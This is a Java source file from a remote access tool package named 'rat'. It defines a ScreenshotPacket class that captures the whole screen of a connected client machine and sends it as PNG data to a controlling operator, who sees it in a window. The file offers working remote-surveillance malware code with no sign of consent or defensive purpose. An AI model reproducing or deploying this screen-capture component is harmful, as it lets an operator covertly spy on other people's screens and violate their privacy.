package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import javax.imageio.ImageIO;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.rat.ActiveClient;

public final class ScreenshotPacket extends AbstractPingPongPacket {
	
	private BufferedImage image;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(10, 10, BufferedImage.TYPE_INT_RGB);
	private static final int SCREEN_WIDTH = 800;
	private static final int SCREEN_HEIGHT = 600;
	
	public ScreenshotPacket(final BufferedImage image) {
		this.image = image;
		
		type = DATA;
	}
	
	public ScreenshotPacket() {
		this(NO_IMAGE);
		
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		
		try {
			ImageIO.write(image, "PNG", out);
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
		
		final byte[] data = out.toByteArray();
		
		client.writeInt(data.length);
		client.write(data);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		final int length = client.readInt();
		final byte[] data = new byte[length];
		
		client.read(data);
		
		final ByteArrayInputStream in = new ByteArrayInputStream(data);
		
		try {
			image = ImageIO.read(in);
		} catch (final IOException ex) {
			image = NO_IMAGE;
			
			ex.printStackTrace();
		}
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		type = DATA;
		image = takeScreenshot();
		
		if (image == null) {
			image = NO_IMAGE;
		}
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		final Screen screen = new Screen(width, height);
		
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, null);
		});
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.show();
		screen.redraw();
	}
	
	public BufferedImage getImage() {
		return image;
	}
	
	public static BufferedImage takeScreenshot() {
		final Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
		final Rectangle screenRect = new Rectangle(screen);
		
		try {
			final Robot robot = new Robot();
			final BufferedImage image = robot.createScreenCapture(screenRect);
			
			return image;
		} catch (final AWTException ex) {
			ex.printStackTrace();
			
			return null;
		}
	}
	
}
